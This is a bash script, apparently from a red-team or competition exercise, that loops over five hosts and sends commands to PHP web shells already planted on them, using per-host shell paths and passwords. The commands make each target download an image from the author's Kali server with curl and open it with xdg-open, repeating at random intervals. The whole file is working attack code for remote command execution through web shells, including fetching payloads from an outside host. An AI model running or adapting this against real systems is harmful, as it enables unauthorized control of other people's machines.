#!/bin/bash

# Declare IP and image
declare -A keys
declare -A images
declare -A paths

# IP Key mapping 
keys["10.162.0.212"]="gekkomon"
keys["10.162.1.212"]="gekkomon"
keys["10.162.2.212"]="gekkomon"
keys["10.162.3.212"]="juventus"
keys["10.162.4.212"]="gekkomon"

# IP Image Mapping
images["10.162.0.212"]="amongus.gif"
images["10.162.1.212"]="bird.png"
images["10.162.2.212"]="Trobbio.jpg"
images["10.162.3.212"]="finger.jpeg"
images["10.162.4.212"]="Real.jpg"

# IP Webshell path mapping
paths["10.162.0.212"]="license.php"
paths["10.162.1.212"]="content/license.php"
paths["10.162.2.212"]="license.php"
paths["10.162.3.212"]="proverb100.php"
paths["10.162.4.212"]="license.php"

# Website directory of images
SERVER="http://10.162.6.107:8000"

# Function: Reupload image
upload_image() {
	local ip="$1"
	local key="${keys[$ip]}"
	local img="${images[$ip]}"
	local path="${paths[$ip]}"
	local remote_path="/tmp/$img"

	#Build the webshell URL
	local shell_url="http://$ip/$path?key=$key"

	#Command sent to web shell: target box downloads image from my kali server
	local upload_cmd="curl%20-s%20$SERVER/$img%20-o%20$remote_path"

	#send command to the target
	curl -s "$shell_url&cmd=$upload_cmd" 
}

# Function: Display Image
trigger_image(){
	local ip="$1"
	local key="${keys[$ip]}"
	local img="${images[$ip]}"
	local path="${paths[$ip]}"
	local remote_path="/tmp/$img"

	#Build the webshell URL
	local shell_url="http://$ip/$path?key=$key"

	#Command sent to web shell: target box opens image with xdg-open
	local open_cmd="xdg-open%20$remote_path"

	#send command to the target
	curl -s "$shell_url&cmd=$open_cmd" 
}

# Main Loop:
while true; do
	for ip in "${!keys[@]}"; do
		upload_image "$ip"
		trigger_image "$ip"
	done
	sleep $((RANDOM % 300 + 60))
done

